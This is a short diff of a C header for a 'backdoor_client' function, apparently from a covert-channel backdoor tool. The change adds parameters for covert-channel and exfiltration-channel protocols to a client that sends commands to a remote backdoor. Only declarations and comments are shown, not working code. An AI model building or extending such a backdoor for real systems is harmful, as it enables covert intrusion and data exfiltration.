@@ -28,14 +28,15 @@ FUNCTION: backdoor_client
 PARAMS:
 	char *ipaddr: The remote host's ip address.
 	int dport: The port the remote host is "listening" on.
-	int duplex: Whether or not we are expecting responses.
+	int cchan: Protocol for covert channel.
+	int xchan: Protocol for exfiltration channel.
 
 RETURN: none.
 
 NOTES: Call this function to start reading commands from standard input
 	and sending them to the backdoor.
 */
-void backdoor_client(uint32 ipaddr, int dport);
+void backdoor_client(uint32 ipaddr, int dport, int cchan, int xchan);
 /*
 FUNCTION: listen_thread
 
